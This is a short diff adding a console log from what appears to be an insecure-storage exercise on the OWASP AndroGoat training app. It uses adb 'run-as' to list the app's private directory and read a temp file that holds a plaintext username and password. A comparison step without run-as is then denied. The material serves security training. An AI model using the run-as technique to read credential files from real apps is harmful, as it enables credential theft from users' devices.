@@ -1,0 +1,17 @@
+﻿PS> adb shell run-as owasp.sat.agoat ls -l
+total 48
+drwxrws--x 2 u0_a174 u0_a174_cache 4096 2026-11-12 03:03 cache
+drwxrws--x 2 u0_a174 u0_a174_cache 4096 2026-11-12 03:03 code_cache
+drwxrwx--x 2 u0_a174 u0_a174       4096 2026-11-12 03:53 databases
+drwxrwx--x 2 u0_a174 u0_a174       4096 2026-11-12 03:52 files
+drwxrwx--x 2 u0_a174 u0_a174       4096 2026-11-12 03:53 shared_prefs
+-rw------- 1 u0_a174 u0_a174         41 2026-11-12 03:54 users689386731629139472tmp
+PS> adb shell run-as owasp.sat.agoat sh -c 'cat users*tmp'
+username is carol
+password is Car0l#Temp
+
+# [대조] 일반 권한에서 직접 접근
+PS> adb shell ls -ld /data/data/owasp.sat.agoat
+drwx------ 7 u0_a174 u0_a174 4096 2026-11-12 03:54 /data/data/owasp.sat.agoat
+PS> adb shell su shell sh -c 'cat /data/data/owasp.sat.agoat/users*tmp'
+cat: /data/data/owasp.sat.agoat/users*tmp: Permission denied
